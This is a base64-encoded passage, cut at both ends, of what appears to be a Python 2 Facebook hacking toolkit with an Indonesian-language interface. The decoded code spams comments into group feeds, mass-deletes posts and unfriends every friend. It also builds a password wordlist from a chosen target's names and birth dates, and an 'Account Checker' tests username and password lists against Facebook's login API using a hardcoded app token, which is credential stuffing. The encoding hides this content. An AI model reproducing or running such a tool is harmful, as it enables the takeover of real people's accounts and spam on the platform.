bS8iK2YrIi9jb21tZW50cz9tZXNzYWdlPSIra20rIiZhY2Nlc3NfdG9rZW49IitmYl90b2tlbikKCQkJcHJpbnQgJ1wwMzNbMTs5Mm1bXDAzM1sxOzk3bScra21bOjEwXS5yZXBsYWNlKCdcbicsJyAnKSsnLi4uIFwwMzNbMTs5Mm1dJwoJCXByaW50IDQyKiJcMDMzWzE7OTdt4pWQIgoJCXByaW50ICJcclwwMzNbMTs5MW1bK11cMDMzWzE7OTJtIERvbmUgXDAzM1sxOzk3bSIrc3RyKGxlbihjb21tZW50KSkKCQlyYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQoJCW1lbnVfYm90KCkKCWV4Y2VwdCBLZXlFcnJvcjoKCQlwcmludCJcMDMzWzE7OTFtWyFdIElEIG5vdCBmb3VuZCIKCQlyYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQoJCW1lbnVfYm90KCkKCiMjIyMjIEJPVCBDT01NRU5UIGdyb3VwICMjIyMjCmRlZiBncm91cF9jb21tZW50KCk6Cglvcy5zeXN0ZW0oJ2NsZWFyJykKCXRyeToKCQlmYl90b2tlbj1vcGVuKCdsb2dpbi50eHQnLCdyJykucmVhZCgpCglleGNlcHQgSU9FcnJvcjoKCQlwcmludCJcMDMzWzE7OTFtWyFdIFRva2VuIG5vdCBmb3VuZCIKCQlvcy5zeXN0ZW0oJ3JtIC1yZiBsb2dpbi50eHQnKQoJCXRpbWUuc2xlZXAoMC4wMSkKCQlsb2dpbigpCglvcy5zeXN0ZW0oJ2NsZWFyJykKCXByaW50IGxvZ28KCXByaW50ICJcMDMzWzE7OTFtWyFdIFwwMzNbMTs5Mm1Vc2UgXDAzM1sxOzk3bSc8PicgXDAzM1sxOzkybWZvciBuZXcgbGluZXMiCglpZGUgPSByYXdfaW5wdXQoJ1wwMzNbMTs5MW1bK10gXDAzM1sxOzkybUlEIEdyb3VwICBcMDMzWzE7OTFtOlwwMzNbMTs5N20gJykKCWttID0gcmF3X2lucHV0KCdcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1Db21tZW50IFwwMzNbMTs5MW06XDAzM1sxOzk3bSAnKQoJbGltaXQgPSByYXdfaW5wdXQoIlwwMzNbMTs5MW1bIV0gXDAzM1sxOzkybUxpbWl0IFwwMzNbMTs5MW06XDAzM1sxOzk3bSAiKQoJa209a20ucmVwbGFjZSgnPD4nLCdcbicpCgl0cnk6CgkJcj1yZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tL2dyb3VwLz9pZD0nK2lkZSsnJmFjY2Vzc190b2tlbj0nK2ZiX3Rva2VuKQoJCWFzdz1qc29uLmxvYWRzKHIudGV4dCkKCQlwcmludCJcMDMzWzE7OTFtW1wwMzNbMTs5Nm3inJNcMDMzWzE7OTFtXSBcMDMzWzE7OTJtRnJvbSBncm91cCBcMDMzWzE7OTFtOlwwMzNbMTs5N20gIithc3dbJ25hbWUnXQoJZXhjZXB0IEtleUVycm9yOgoJCXByaW50IlwwMzNbMTs5MW1bIV0gR3JvdXAgbm90IGZvdW5kIgoJCXJhd19pbnB1dCgiXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpCgkJbWVudV9ib3QoKQoJdHJ5OgoJCXAgPSByZXF1ZXN0cy5nZXQoImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tL3YzLjAvIitpZGUrIj9maWVsZHM9ZmVlZC5saW1pdCgiK2xpbWl0KyIpJmFjY2Vzc190b2tlbj0iK2ZiX3Rva2VuKQoJCWEgPSBqc29uLmxvYWRzKHAudGV4dCkKCQlta2RpcignXDAzM1sxOzkxbVvinLpdIFwwMzNbMTs5Mm1TdGFydCBcMDMzWzE7OTdtLi4uJykKCQlwcmludCA0MioiXDAzM1sxOzk3beKVkCIKCQlmb3IgcyBpbiBhWydmZWVkJ11bJ2RhdGEnXToKCQkJZiA9IHNbJ2lkJ10KCQkJZ3JvdXBfY29tbWVudC5hcHBlbmQoZikKCQkJcmVxdWVzdHMucG9zdCgiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vIitmKyIvY29tbWVudHM/bWVzc2FnZT0iK2ttKyImYWNjZXNzX3Rva2VuPSIrZmJfdG9rZW4pCgkJCXByaW50ICdcMDMzWzE7OTJtW1wwMzNbMTs5N20nK2ttWzoxMF0ucmVwbGFjZSgnXG4nLCcgJykrJy4uLiBcMDMzWzE7OTJtXScKCQlwcmludCA0MioiXDAzM1sxOzk3beKVkCIKCQlwcmludCAiXHJcMDMzWzE7OTFtWytdXDAzM1sxOzkybSBEb25lIFwwMzNbMTs5N20iK3N0cihsZW4oZ3JvdXBfY29tbWVudCkpCgkJcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikKCQltZW51X2JvdCgpCglleGNlcHQgS2V5RXJyb3I6CgkJcHJpbnQiXDAzM1sxOzkxbVshXSBFcnJvciIKCQlyYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQoJCW1lbnVfYm90KCkKCiMjIyMjIFBPU1QgIyMjIyMKZGVmIGRlbGV0ZXBvc3QoKToKCW9zLnN5c3RlbSgnY2xlYXInKQoJdHJ5OgoJCWZiX3Rva2VuPW9wZW4oJ2xvZ2luLnR4dCcsJ3InKS5yZWFkKCkKCQluYW0gPSByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tL21lP2FjY2Vzc190b2tlbj0nK2ZiX3Rva2VuKQoJCWxvbCA9IGpzb24ubG9hZHMobmFtLnRleHQpCgkJZmJfbmFtZSA9IGxvbFsnbmFtZSddCglleGNlcHQgSU9FcnJvcjoKCQlwcmludCJcMDMzWzE7OTFtWyFdIFRva2VuIG5vdCBmb3VuZCIKCQlvcy5zeXN0ZW0oJ3JtIC1yZiBsb2dpbi50eHQnKQoJCXRpbWUuc2xlZXAoMC4wMSkKCQlsb2dpbigpCglvcy5zeXN0ZW0oJ2NsZWFyJykKCXByaW50IGxvZ28KCXByaW50KCJcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1Gcm9tIFwwMzNbMTs5MW06IFwwMzNbMTs5N20lcyIlZmJfbmFtZSkKCW1rZGlyKCJcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1TdGFydFwwMzNbMTs5N20gLi4uIikKCXByaW50IDQyKiJcMDMzWzE7OTdt4pWQIgoJYXN1ID0gcmVxdWVzdHMuZ2V0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS9tZS9mZWVkP2FjY2Vzc190b2tlbj0nK2ZiX3Rva2VuKQoJYXN1cyA9IGpzb24ubG9hZHMoYXN1LnRleHQpCglmb3IgcCBpbiBhc3VzWydkYXRhJ106CgkJaWQgPSBwWydpZCddCgkJcGlybyA9IDAKCQl1cmwgPSByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLycraWQrJz9tZXRob2Q9ZGVsZXRlJmFjY2Vzc190b2tlbj0nK2ZiX3Rva2VuKQoJCW9rID0ganNvbi5sb2Fkcyh1cmwudGV4dCkKCQl0cnk6CgkJCWVycm9yID0gb2tbJ2Vycm9yJ11bJ21lc3NhZ2UnXQoJCQlwcmludCAnXDAzM1sxOzkxbVtcMDMzWzE7OTdtJytpZFs6MTBdLnJlcGxhY2UoJ1xuJywnICcpKycuLi4nKydcMDMzWzE7OTFtXSBcMDMzWzE7OTVtRmFpbGVkJwoJCWV4Y2VwdCBUeXBlRXJyb3I6CgkJCXByaW50ICdcMDMzWzE7OTJtW1wwMzNbMTs5N20nK2lkWzoxMF0ucmVwbGFjZSgnXG4nLCcgJykrJy4uLicrJ1wwMzNbMTs5Mm1dIFwwMzNbMTs5Nm1EZWxldGVkJwoJCQlwaXJvICs9IDEKCQlleGNlcHQgcmVxdWVzdHMuZXhjZXB0aW9ucy5Db25uZWN0aW9uRXJyb3I6CgkJCXByaW50IlwwMzNbMTs5MW1bIV0gQ29ubmVjdGlvbiBFcnJvciIKCQkJcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikKCQkJbWVudV9ib3QoKQoJcHJpbnQgNDIqIlwwMzNbMTs5N23ilZAiCglwcmludCJcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1Eb25lIgoJcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikKCW1lbnVfYm90KCkKCiMjIyMjIEFDQ0VQVCBGUklFTkQgIyMjIyMKZGVmIGFjY2VwdCgpOgoJb3Muc3lzdGVtKCdjbGVhcicpCgl0cnk6CgkJZmJfdG9rZW49b3BlbignbG9naW4udHh0JywncicpLnJlYWQoKQoJZXhjZXB0IElPRXJyb3I6CgkJcHJpbnQiXDAzM1sxOzkxbVshXSBUb2tlbiBub3QgZm91bmQiCgkJb3Muc3lzdGVtKCdybSAtcmYgbG9naW4udHh0JykKCQl0aW1lLnNsZWVwKDAuMDEpCgkJbG9naW4oKQoJb3Muc3lzdGVtKCdjbGVhcicpCglwcmludCBsb2dvCglsaW1pdCA9IHJhd19pbnB1dCgiXDAzM1sxOzkxbVshXSBcMDMzWzE7OTJtTGltaXQgXDAzM1sxOzkxbTpcMDMzWzE7OTdtICIpCglyID0gcmVxdWVzdHMuZ2V0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS9tZS9mcmllbmRyZXF1ZXN0cz9saW1pdD0nK2xpbWl0KycmYWNjZXNzX3Rva2VuPScrZmJfdG9rZW4pCglmcmllbmRzID0ganNvbi5sb2FkcyhyLnRleHQpCglpZiAnW10nIGluIHN0cihmcmllbmRzWydkYXRhJ10pOgoJCXByaW50IlwwMzNbMTs5MW1bIV0gTm8gZnJpZW5kIHJlcXVlc3QiCgkJcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikKCQltZW51X2JvdCgpCglta2RpcignXDAzM1sxOzkxbVvinLpdIFwwMzNbMTs5Mm1TdGFydCBcMDMzWzE7OTdtLi4uJykKCXByaW50IDQyKiJcMDMzWzE7OTdt4pWQIgoJZm9yIGkgaW4gZnJpZW5kc1snZGF0YSddOgoJCWdhcyA9IHJlcXVlc3RzLnBvc3QoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tL21lL2ZyaWVuZHMvJytpWydmcm9tJ11bJ2lkJ10rJz9hY2Nlc3NfdG9rZW49JytmYl90b2tlbikKCQlhID0ganNvbi5sb2FkcyhnYXMudGV4dCkKCQlpZiAnZXJyb3InIGluIHN0cihhKToKCQkJcHJpbnQgIlwwMzNbMTs5N21bIFwwMzNbMTs5MW1GYWlsZWRcMDMzWzE7OTdtIF0gIitpWydmcm9tJ11bJ25hbWUnXQoJCWVsc2U6CgkJCXByaW50ICJcMDMzWzE7OTdtWyBcMDMzWzE7OTJtQWNjZXB0XDAzM1sxOzk3bSBdICIraVsnZnJvbSddWyduYW1lJ10KCXByaW50IDQyKiJcMDMzWzE7OTdt4pWQIgoJcHJpbnQiXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtRG9uZSIKCXJhd19pbnB1dCgiXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpCgltZW51X2JvdCgpCgojIyMjIyBVTkZSSUVORCAjIyMjCmRlZiB1bmZyaWVuZCgpOgoJb3Muc3lzdGVtKCdjbGVhcicpCgl0cnk6CgkJZmJfdG9rZW49b3BlbignbG9naW4udHh0JywncicpLnJlYWQoKQoJZXhjZXB0IElPRXJyb3I6CgkJcHJpbnQiXDAzM1sxOzkxbVshXSBUb2tlbiBub3QgZm91bmQiCgkJb3Muc3lzdGVtKCdybSAtcmYgbG9naW4udHh0JykKCQl0aW1lLnNsZWVwKDAuMDEpCgkJbG9naW4oKQoJb3Muc3lzdGVtKCdjbGVhcicpCglwcmludCBsb2dvCglta2RpcignXDAzM1sxOzkxbVvinLpdIFwwMzNbMTs5Mm1TdGFydCBcMDMzWzE7OTdtLi4uJykKCXByaW50ICJcMDMzWzE7OTdtU3RvcCBcMDMzWzE7OTFtQ1RSTCtDIgoJcHJpbnQgNDIqIlwwMzNbMTs5N23ilZAiCgl0cnk6CgkJcGlja3MgPSByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tL21lL2ZyaWVuZHM/YWNjZXNzX3Rva2VuPScrZmJfdG9rZW4pCgkJdHJ5eSA9IGpzb24ubG9hZHMocGlja3MudGV4dCkKCQlmb3IgaSBpbiB0cnl5WydkYXRhJ106CgkJCWZiX25hbWUgPSBpWyduYW1lJ10KCQkJaWQgPSBpWydpZCddCgkJCXJlcXVlc3RzLmRlbGV0ZSgiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vbWUvZnJpZW5kcz91aWQ9IitpZCsiJmFjY2Vzc190b2tlbj0iK2ZiX3Rva2VuKQoJCQlwcmludCAiXDAzM1sxOzk3bVtcMDMzWzE7OTJtIERlbGV0ZWQgXDAzM1sxOzk3bV0gIitmYl9uYW1lCglleGNlcHQgSW5kZXhFcnJvcjogcGFzcwoJZXhjZXB0IEtleWJvYXJkSW50ZXJydXB0OgoJCXByaW50ICJcMDMzWzE7OTFtWyFdIFN0b3BwZWQiCgkJcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikKCQltZW51X2JvdCgpCglwcmludCJcblwwMzNbMTs5MW1bK10gXDAzM1sxOzkybURvbmUiCglyYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQoJbWVudV9ib3QoKQoKIyMjIyBQT1NUSU5HIyMjIyMKIyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICMKIyMjI1BPU1QgTUVOVSMjIyMjCmRlZiBmdW5jKCk6Cglvcy5zeXN0ZW0oJ2NsZWFyJykKCXRyeToKCQlmYl90b2tlbj1vcGVuKCdsb2dpbi50eHQnLCdyJykucmVhZCgpCglleGNlcHQgSU9FcnJvcjoKCQlwcmludCJcMDMzWzE7OTFtWyFdIFRva2VuIG5vdCBmb3VuZCIKCQlvcy5zeXN0ZW0oJ3JtIC1yZiBsb2dpbi50eHQnKQoJCXRpbWUuc2xlZXAoMC4wMSkKCQlsb2dpbigpCglvcy5zeXN0ZW0oJ2NsZWFyJykKCXByaW50IGxvZ28KCXByaW50ICJcMDMzWzE7OTdt4pWRLS1cMDMzWzE7OTFtPiBcMDMzWzE7OTJtMS5cMDMzWzE7OTdtIENyZWF0ZSBQb3N0IgoJcHJpbnQgIlwwMzNbMTs5N23ilZEtLVwwMzNbMTs5MW0+IFwwMzNbMTs5Mm0yLlwwMzNbMTs5N20gQ3JlYXRlIFdvcmRsaXN0IgoJcHJpbnQgIlwwMzNbMTs5N23ilZEtLVwwMzNbMTs5MW0+IFwwMzNbMTs5Mm0zLlwwMzNbMTs5N20gQWNjb3VudCBDaGVja2VyIgoJcHJpbnQgIlwwMzNbMTs5N23ilZEtLVwwMzNbMTs5MW0+IFwwMzNbMTs5Mm00LlwwMzNbMTs5N20gU2VlIG15IGdyb3VwIGxpc3QiCglwcmludCAiXDAzM1sxOzk3beKVkS0tXDAzM1sxOzkxbT4gXDAzM1sxOzkybTUuXDAzM1sxOzk3bSBQcm9maWxlIEd1YXJkIgoJcHJpbnQgIlwwMzNbMTs5N23ilZEtLVwwMzNbMTs5MW0+IFwwMzNbMTs5MW0wLlwwMzNbMTs5N20gQmFjayIKCXByaW50ICLilZEiCgljaG9vc2luZ19hZ2FpbigpCiMvLy8vLy8vLy8vLy8KZGVmIGNob29zaW5nX2FnYWluKCk6CglvdGhlciA9IHJhd19pbnB1dCgiXDAzM1sxOzk3beKVmuKVkFwwMzNbMTs5MW1EIFwwMzNbMTs5N20iKQoJaWYgb3RoZXIgPT0iIjoKCQlwcmludCAiXDAzM1sxOzkxbVshXSBXcm9uZyBpbnB1dCIKCQljaG9vc2luZ19hZ2FpbigpCgllbGlmIG90aGVyID09IjEiOgoJCXN0YXR1cygpCgllbGlmIG90aGVyID09IjIiOgoJCXdvcmRsaXN0KCkKCWVsaWYgb3RoZXIgPT0iMyI6CgkJY2hlY2tfYWt1bigpCgllbGlmIG90aGVyID09IjQiOgoJCWdyb3VwX2xpc3QoKQoJZWxpZiBvdGhlciA9PSI1IjoKCQlndWFyZCgpCgllbGlmIG90aGVyID09IjAiOgoJCW1lbnUoKQoJZWxzZToKCQlwcmludCAiXDAzM1sxOzkxbVshXSBXcm9uZyBpbnB1dCIKCQljaG9vc2luZ19hZ2FpbigpCgojIyMjIyBTVEFUVVMgIyMjIyMKZGVmIHN0YXR1cygpOgoJb3Muc3lzdGVtKCdjbGVhcicpCgl0cnk6CgkJZmJfdG9rZW49b3BlbignbG9naW4udHh0JywncicpLnJlYWQoKQoJZXhjZXB0IElPRXJyb3I6CgkJcHJpbnQiXDAzM1sxOzkxbVshXSBUb2tlbiBub3QgZm91bmQiCgkJb3Muc3lzdGVtKCdybSAtcmYgbG9naW4udHh0JykKCQl0aW1lLnNsZWVwKDAuMDEpCgkJbG9naW4oKQoJb3Muc3lzdGVtKCdjbGVhcicpCglwcmludCBsb2dvCgltc2c9cmF3X2lucHV0KCdcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1UeXBlIHN0YXR1cyBcMDMzWzE7OTFtOlwwMzNbMTs5N20gJykKCWlmIG1zZyA9PSAiIjoKCQlwcmludCAiXDAzM1sxOzkxbVshXSBEb24ndCBiZSBlbXB0eSIKCQlyYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQoJCWZ1bmMoKQoJZWxzZToKCQlyZXMgPSByZXF1ZXN0cy5nZXQoImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tL21lL2ZlZWQ/bWV0aG9kPVBPU1QmbWVzc2FnZT0iK21zZysiJmFjY2Vzc190b2tlbj0iK2ZiX3Rva2VuKQoJCW9wID0ganNvbi5sb2FkcyhyZXMudGV4dCkKCQlta2RpcignXDAzM1sxOzkxbVvinLpdIFwwMzNbMTs5Mm1DcmVhdGUgXDAzM1sxOzk3bS4uLicpCgkJcHJpbnQgNDIqIlwwMzNbMTs5N23ilZAiCgkJcHJpbnQiXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtU3RhdHVzIElEXDAzM1sxOzkxbSA6IFwwMzNbMTs5N20iK29wWydpZCddCgkJcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikKCQlmdW5jKCkKCiMjIyMjIyMjIyMjIENSRUFURSBXT1JETElTVCAjIyMjIyMjIyMjCmRlZiB3b3JkbGlzdCgpOgoJb3Muc3lzdGVtKCdjbGVhcicpCgl0cnk6CgkJZmJfdG9rZW49b3BlbignbG9naW4udHh0JywncicpLnJlYWQoKQoJZXhjZXB0IElPRXJyb3I6CgkJcHJpbnQiXDAzM1sxOzkxbVshXSBUb2tlbiBub3QgZm91bmQiCgkJb3Muc3lzdGVtKCdybSAtcmYgbG9naW4udHh0JykKCQl0aW1lLnNsZWVwKDAuMDEpCgkJbG9naW4oKQoJdHJ5OgoJCW9zLnN5c3RlbSgnY2xlYXInKQoJCXByaW50IGxvZ28KCQlwcmludCAiXDAzM1sxOzkxbVs/XSBcMDMzWzE7OTJtRmlsbCBpbiB0aGUgY29tcGxldGUgZGF0YSBvZiB0aGUgdGFyZ2V0IGJlbG93IgoJCXByaW50IDQyKiJcMDMzWzE7OTdt4pWQIgoJCWEgPSByYXdfaW5wdXQoIlwwMzNbMTs5MW1bK10gXDAzM1sxOzkybWZiX25hbWUgRGVwYW4gXDAzM1sxOzk3bTogIikKCQlmaWxlID0gb3BlbihhKyIudHh0IiwgJ3cnKQoJCWI9cmF3X2lucHV0KCJcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1mYl9uYW1lIFRlbmdhaCBcMDMzWzE7OTdtOiAiKQoJCWM9cmF3X2lucHV0KCJcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1mYl9uYW1lIEJlbGFrYW5nIFwwMzNbMTs5N206ICIpCgkJZD1yYXdfaW5wdXQoIlwwMzNbMTs5MW1bK10gXDAzM1sxOzkybWZiX25hbWUgUGFuZ2dpbGFuIFwwMzNbMTs5N206ICIpCgkJZT1yYXdfaW5wdXQoIlwwMzNbMTs5MW1bK10gXDAzM1sxOzkybVRhbmdnYWwgTGFoaXIgPlwwMzNbMTs5Nm1leDogfERETU1ZWXwgXDAzM1sxOzk3bTogIikKCQlmPWVbMDoyXQoJCWc9ZVsyOjRdCgkJaD1lWzQ6XQoJCXByaW50IDQyKiJcMDMzWzE7OTdt4pWQIgoJCXByaW50KCJcMDMzWzE7OTFtWz9dIFwwMzNbMTs5M21LYWxvIEpvbWJsbyBTS0lQIGFqYSA6diIpCgkJaT1yYXdfaW5wdXQoIlwwMzNbMTs5MW1bK10gXDAzM1sxOzkybWZiX25hbWUgUGFjYXIgXDAzM1sxOzk3bTogIikKCQlqPXJhd19pbnB1dCgiXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtZmJfbmFtZSBQYW5nZ2lsYW4gUGFjYXIgXDAzM1sxOzk3bTogIikKCQlrPXJhd19pbnB1dCgiXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtVGFuZ2dhbCBMYWhpciBQYWNhciA+XDAzM1sxOzk2bWV4OiB8RERNTVlZfCBcMDMzWzE7OTdtOiAiKQoJCW1rZGlyKCdcMDMzWzE7OTFtW+Kcul0gXDAzM1sxOzkybUNyZWF0ZSBcMDMzWzE7OTdtLi4uJykKCQlsPWtbMDoyXQoJCW09a1syOjRdCgkJbj1rWzQ6XQoJCWZpbGUud3JpdGUoIiVzJXNcbiVzJXMlcyVzXG4lcyVzXG4lcyVzXG4lcyVzXG4lcyVzXG4lcyVzXG4lcyVzXG4lcyVzXG4lcyVzXG4lcyVzXG4lcyVzXG4lcyVzXG4lcyVzXG4lcyVzXG4lcyVzXG4lcyVzXG4lcyVzXG4lcyVzXG4lcyVzXG4lcyVzXG4lcyVzXG4lcyVzXG4lcyVzXG4lcyVzXG4lcyVzXG4lcyVzXG4lcyVzXG4lcyVzXG4lcyVzXG4lcyVzXG4lcyVzXG4lcyVzXG4lcyVzXG4lcyVzXG4lcyVzXG4lcyVzXG4lcyVzXG4lcyVzXG4lcyVzXG4lcyVzXG4lcyVzXG4lcyVzXG4lcyVzXG4lcyVzXG4lcyVzXG4lcyVzXG4lcyVzXG4lcyVzJXNcbiVzJXMlc1xuJXMlc1xuJXMlc1xuJXMlc1xuJXMlc1xuJXMlc1xuJXMlc1xuJXMlc1xuJXMlc1xuJXMlc1xuJXMlcyVzXG4lcyVzJXNcbiVzJXMlc1xuJXMlcyVzXG4lcyVzJXNcbiVzJXMlc1xuJXMlcyVzXG4lcyVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXMiICUgKGEsYyxhLGIsYixhLGIsYyxjLGEsYyxiLGEsYSxiLGIsYyxjLGEsZCxiLGQsYyxkLGQsZCxkLGEsZCxiLGQsYyxhLGUsYSxmLGEsZyxhLGgsYixlLGIsZixiLGcsYixoLGMsZSxjLGYsYyxnLGMsaCxkLGUsZCxmLGQsZyxkLGgsZSxhLGYsYSxnLGEsaCxhLGUsYixmLGIsZyxiLGgsYixlLGMsZixjLGcsYyxoLGMsZSxkLGYsZCxnLGQsaCxkLGQsZCxhLGYsZyxhLGcsaCxmLGcsZixoLGYsZixnLGYsZyxoLGcsZyxoLGYsaCxnLGgsaCxoLGcsZixhLGcsaCxiLGYsZyxiLGcsaCxjLGYsZyxjLGcsaCxkLGYsZyxkLGcsaCxhLGksYSxqLGEsayxpLGUsaSxqLGksayxiLGksYixqLGIsayxjLGksYyxqLGMsayxlLGssaixhLGosYixqLGMsaixkLGosaixrLGEsayxiLGssYyxrLGQsayxrLGksbCxpLG0saSxuLGosbCxqLG0saixuLGosaykpCgkJd2cgPSAwCgkJd2hpbGUgKHdnIDwgMTAwKToKCQkJd2cgPSB3ZyArIDEKCQkJZmlsZS53cml0ZShhICsgc3RyKHdnKSArICdcbicpCgkJZW4gPSAwCgkJd2hpbGUgKGVuIDwgMTAwKToKCQkJZW4gPSBlbiArIDEKCQkJZmlsZS53cml0ZShpICsgc3RyKGVuKSArICdcbicpCgkJd29yZCA9IDAKCQl3aGlsZSAod29yZCA8IDEwMCk6CgkJCXdvcmQgPSB3b3JkICsgMQoJCQlmaWxlLndyaXRlKGQgKyBzdHIod29yZCkgKyAnXG4nKQoJCWdlbiA9IDAKCQl3aGlsZSAoZ2VuIDwgMTAwKToKCQkJZ2VuID0gZ2VuICsgMQoJCQlmaWxlLndyaXRlKGogKyBzdHIoZ2VuKSArICdcbicpCgkJZmlsZS5jbG9zZSgpCgkJdGltZS5zbGVlcCgxLjUpCgkJcHJpbnQgNDIqIlwwMzNbMTs5N23ilZAiCgkJcHJpbnQgKCJcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1TYXZlZCBcMDMzWzE7OTFtOiBcMDMzWzE7OTdtICVzLnR4dCIgJWEpCgkJcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikKCQlmdW5jKCkKCWV4Y2VwdCBJT0Vycm9yLCBlOgoJCXByaW50KCJcMDMzWzE7OTFtWyFdIEZhaWxlZCIpCgkJcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikKCQlmdW5jKCkKCiMjIyMjIENIRUNLRVIgIyMjIyMKZGVmIGNoZWNrX2FrdW4oKToKCW9zLnN5c3RlbSgnY2xlYXInKQoJdHJ5OgoJCWZiX3Rva2VuPW9wZW4oJ2xvZ2luLnR4dCcsJ3InKS5yZWFkKCkKCWV4Y2VwdCBJT0Vycm9yOgoJCXByaW50IlwwMzNbMTs5MW1bIV0gVG9rZW4gbm90IGZvdW5kIgoJCW9zLnN5c3RlbSgncm0gLXJmIGxvZ2luLnR4dCcpCgkJdGltZS5zbGVlcCgwLjAxKQoJCWxvZ2luKCkKCW9zLnN5c3RlbSgnY2xlYXInKQoJcHJpbnQgbG9nbwoJcHJpbnQgIlwwMzNbMTs5MW1bP10gXDAzM1sxOzkybUNyZWF0ZSBpbiBmaWxlXDAzM1sxOzkxbSA6IFwwMzNbMTs5N211c2VybmFtZXxwYXNzd29yZCIKCXByaW50IDQyKiJcMDMzWzE7OTdt4pWQIgoJbGl2ZSA9IFtdCgljaGVja19pdCA9IFtdCglkaWUgPSBbXQoJdHJ5OgoJCWZpbGUgPSByYXdfaW5wdXQoIlwwMzNbMTs5MW1bK10gXDAzM1sxOzkybUZpbGUgcGF0aCBcMDMzWzE7OTFtOlwwMzNbMTs5N20gIikKCQlsaXN0ID0gb3BlbihmaWxlLCdyJykucmVhZGxpbmVzKCkKCWV4Y2VwdCBJT0Vycm9yOgoJCXByaW50ICgiXDAzM1sxOzkxbVshXSBGaWxlIG5vdCBmb3VuZCIpCgkJcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikKCQlmdW5jKCkKCXBlbWlzYWggPSByYXdfaW5wdXQoIlwwMzNbMTs5MW1bK10gXDAzM1sxOzkybVNlcGFyYXRvciBcMDMzWzE7OTFtOlwwMzNbMTs5N20gIikKCW1rZGlyKCdcMDMzWzE7OTFtW+Kcul0gXDAzM1sxOzkybVN0YXJ0IFwwMzNbMTs5N20uLi4nKQoJcHJpbnQgNDIqIlwwMzNbMTs5N23ilZAiCglmb3IgbWVraSBpbiBsaXN0OgoJCXVzZXJuYW1lLCBwYXNzd29yZCA9IChtZWtpLnN0cmlwKCkpLnNwbGl0KHN0cihwZW1pc2FoKSkKCQl1cmwgPSAiaHR0cHM6Ly9iLWFwaS5mYWNlYm9vay5jb20vbWV0aG9kL2F1dGgubG9naW4/YWNjZXNzX3Rva2VuPTIzNzc1OTkwOTU5MTY1NSUyNTI1N0MwZjE0MGFhYmVkZmI2NWFjMjdhNzM5ZWQxYTIyNjNiMSZmb3JtYXQ9anNvbiZzZGtfdmVyc2lvbj0yJmVtYWlsPSIrKHVzZXJuYW1lKSsiJmxvY2FsZT1lbl9VUyZwYXNzd29yZD0iKyhwYXNzd29yZCkrIiZzZGs9aW9zJmdlbmVyYXRlX3Nlc3Npb25fY29va2llcz0xJnNpZz0zZjU1NWY5OWZiNjFmY2Q3YWEwYzQ0ZjU4ZjUyMmVmNiIKCQlkYXRhID0gcmVxdWVzdHMuZ2V0KHVybCkKCQltcHNoID0ganN